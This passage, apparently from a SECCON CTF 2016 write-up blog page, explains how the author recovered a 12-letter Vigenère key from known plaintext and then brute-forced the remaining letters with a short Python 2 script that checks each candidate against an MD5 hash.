+E|EFGHIJKLMNOPQRSTUVWXYZ{}ABCD
+F|FGHIJKLMNOPQRSTUVWXYZ{}ABCDE
+G|GHIJKLMNOPQRSTUVWXYZ{}ABCDEF
+H|HIJKLMNOPQRSTUVWXYZ{}ABCDEFG
+I|IJKLMNOPQRSTUVWXYZ{}ABCDEFGH
+J|JKLMNOPQRSTUVWXYZ{}ABCDEFGHI
+K|KLMNOPQRSTUVWXYZ{}ABCDEFGHIJ
+L|LMNOPQRSTUVWXYZ{}ABCDEFGHIJK
+M|MNOPQRSTUVWXYZ{}ABCDEFGHIJKL
+N|NOPQRSTUVWXYZ{}ABCDEFGHIJKLM
+O|OPQRSTUVWXYZ{}ABCDEFGHIJKLMN
+P|PQRSTUVWXYZ{}ABCDEFGHIJKLMNO
+Q|QRSTUVWXYZ{}ABCDEFGHIJKLMNOP
+R|RSTUVWXYZ{}ABCDEFGHIJKLMNOPQ
+S|STUVWXYZ{}ABCDEFGHIJKLMNOPQR
+T|TUVWXYZ{}ABCDEFGHIJKLMNOPQRS
+U|UVWXYZ{}ABCDEFGHIJKLMNOPQRST
+V|VWXYZ{}ABCDEFGHIJKLMNOPQRSTU
+W|WXYZ{}ABCDEFGHIJKLMNOPQRSTUV
+X|XYZ{}ABCDEFGHIJKLMNOPQRSTUVW
+Y|YZ{}ABCDEFGHIJKLMNOPQRSTUVWX
+Z|Z{}ABCDEFGHIJKLMNOPQRSTUVWXY
+{|{}ABCDEFGHIJKLMNOPQRSTUVWXYZ
+}|}ABCDEFGHIJKLMNOPQRSTUVWXYZ{
+</code></pre>
+<p style="max-width:100%;height:auto;">密钥长度12，由给出的部分明文推出前7位的key为<code style="max-width:100%;height:auto;">VIGENER</code>，也就是还剩五位，然后我们已知明文的hash，就可以通过枚举密钥解密来对比明文hash值。
+但是五位密钥的话，28的五次方大概1700万+，这里我看密钥样子我猜测第八位密钥为<code style="max-width:100%;height:auto;">E</code>，这样就只用枚举60万+。最后脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import hashlib
+vigenere=&amp;apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ{}&amp;apos;
+key=&amp;apos;VIGENERE&amp;apos;
+len_key=12
+p="SECCON{?????BCDEDEF?????KLMNOPQ?????VWXYYZ}"
+c="LMIG}RPEDOEEWKJIQIWKJWMNDTSR}TFVUFWYOCBAJBQ"
+cnt=0
+def distance(a,b):  #a-b
+    if a&gt;b:
+        return 28-(vigenere.find(a)-vigenere.find(b))
+    else:
+        return (vigenere.find(b)-vigenere.find(a))
+for i1 in vigenere:
+    for j in vigenere:
+        for k in vigenere:
+            for l in vigenere:
+                tmp=key+i1+j+k+l
+                ans=""
+                cnt+=1
+                for i in xrange(len(p)):
+                    ans+=vigenere[distance(tmp[i%12],c[i])]
+                print ans,cnt
+                if hashlib.md5(ans).hexdigest()==&amp;apos;f528a6ab914c1ecf856a1d93103948fe&amp;apos;:
+                    a=raw_input("Success! flag is "+ans)
+</code></pre>
+<p style="max-width:100%;height:auto;">运行截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./Seccon-CTF-2016-部分Writeup/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./Seccon-CTF-2016-部分Writeup/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./Seccon-CTF-2016-部分Writeup/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./Seccon-CTF-2016-部分Writeup/prism.js"></script>
+<script src="./Seccon-CTF-2016-部分Writeup/zooming.js"></script>
+<script src="./Seccon-CTF-2016-部分Writeup/Bendawang.js"></script>
+
+
